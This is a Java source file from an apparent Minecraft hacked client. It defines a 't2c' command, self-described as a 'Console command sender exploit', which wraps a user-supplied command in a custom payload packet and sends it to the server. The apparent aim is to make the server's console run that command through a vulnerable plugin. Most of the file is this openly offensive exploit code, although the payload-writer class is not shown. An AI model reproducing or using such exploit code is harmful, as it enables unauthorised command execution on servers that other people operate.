package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.ArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.CommandSource;
import net.minecraft.Packet;
import net.minecraft.CustomPayloadC2SPacket;
import net.minecraft.MinecraftClient;
import net.minecraft.CustomPayload;
import io.github.spigotrce.paradiseclientprivate.writer.T2CWriter;

public class T2C extends Command {
    public T2C(MinecraftClient mc) {
        super("t2c", "Console command sender exploit", mc);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return T2C.literal(this.getName()).executes(this::build).then(T2C.argument("command", StringArgumentType.greedyString()).executes(context -> {
            Helper.sendPacket(new CustomPayloadC2SPacket(new T2CWriter(context.getArgument("command", String.class))));
            Helper.printChatMessage("Payload sent!");
            return 1;
        }));
    }

    private int build(CommandContext<?> context) {
        Helper.printChatMessage("Incomplete command!");
        return 1;
    }
}
